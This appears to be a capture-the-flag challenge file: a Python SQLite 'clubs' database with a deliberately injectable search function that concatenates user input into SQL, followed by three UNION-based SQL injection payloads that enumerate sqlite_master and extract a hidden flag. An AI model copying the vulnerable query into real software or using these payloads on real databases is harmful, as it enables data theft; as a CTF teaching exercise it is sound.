# create clubs db
import sqlite3
import string
import random
from flag import FLAG


def create_db():
    conn = sqlite3.connect('clubs.db')
    c = conn.cursor()
    c.execute('DROP TABLE IF EXISTS clubs')
    conn.commit()
    conn.close()
    conn = sqlite3.connect('clubs.db')
    c = conn.cursor()
    c.execute(
        '''CREATE TABLE IF NOT EXISTS clubs(id INTEGER PRIMARY KEY, name TEXT, UCL_WON INTEGER)''')
    conn.commit()
    conn.close()
    conn = sqlite3.connect('clubs.db')
    c = conn.cursor()
    tmp1 = ''.join(random.choice(string.ascii_lowercase) for i in range(30))
    tmp2 = ''.join(random.choice(string.ascii_lowercase) for i in range(30))
    c.execute('''CREATE TABLE IF NOT EXISTS '''+tmp1 +
              '''(id INTEGER PRIMARY KEY, '''+tmp2+''' TEXT)''')
    conn.commit()
    conn.close()
    conn = sqlite3.connect('clubs.db')
    c = conn.cursor()
    c.execute('''INSERT INTO '''+tmp1+''' ('''+tmp2 +
              ''') VALUES ("'''+FLAG+'''")''')
    conn.commit()
    conn.close()


def search_for_product(search):
    try:
        conn = sqlite3.connect('clubs.db')
        c = conn.cursor()
        c.execute("SELECT * FROM clubs WHERE name LIKE '%"+search+"%'")
        result = c.fetchall()
        conn.commit()
        conn.close()
        if result:
            return result
    except Exception as e:
        print(e)
        return False
    return False

# add product


def add_product(name, UCL_WON):
    try:
        conn = sqlite3.connect('clubs.db')
        c = conn.cursor()
        c.execute("INSERT INTO clubs (name, UCL_WON) VALUES (?, ?)",
                  (name, UCL_WON))
        conn.commit()
        conn.close()
    except Exception as e:
        print(e)
        return False
    return True

# insert items


def fill():
    add_product('REAL MADRID', 15)
    add_product('AC MILAN', 7)
    add_product('CHELSEA', 2)
    add_product('BAYERN MUNICH', 6)
    add_product('INTER MILAN', 3)
    add_product('FC BARCELONA', 5)
    add_product('MANCHESTER UNITED', 3)
    add_product('LIVERPOOL', 6)




# 1. Enumerate Tables to Identify the Random Table Name
# -----------------------------------------------------
# This payload finds all non-internal tables (excluding "clubs")
payload1 = (
    "' UNION SELECT 1, name, 3 FROM sqlite_master "
    "WHERE type='table' AND name NOT LIKE 'sqlite_%' AND name != 'clubs'-- "
)
# Example output includes the random table name:
# ocjigmzqoyhmhcbbksawsiffkoekka

# 2. Retrieve the CREATE Statement to Find the Flag Column Name
# -------------------------------------------------------------
# Adjust the payload by replacing <random_table> with the discovered table name.
payload2 = (
    "%' UNION SELECT 1, sql, 3 FROM sqlite_master "
    "WHERE tbl_name='ocjigmzqoyhmhcbbksawsiffkoekka'--"
)
# Example output will show something like:
# CREATE TABLE ocjigmzqoyhmhcbbksawsiffkoekka(id INTEGER PRIMARY KEY, eesoqioegnwgjzyzmxfdbsuwssdodr TEXT)
# Here, the flag column is: eesoqioegnwgjzyzmxfdbsuwssdodr

# 3. Extract the Flag from the Random Table
# ------------------------------------------
# Now that you know both the table and column names, use this payload to extract the flag.
payload3 = (
    "%' UNION SELECT 1, (SELECT eesoqioegnwgjzyzmxfdbsuwssdodr "
    "FROM ocjigmzqoyhmhcbbksawsiffkoekka LIMIT 1), 3--"
)
# The flag should appear in the JSON response in the second column.
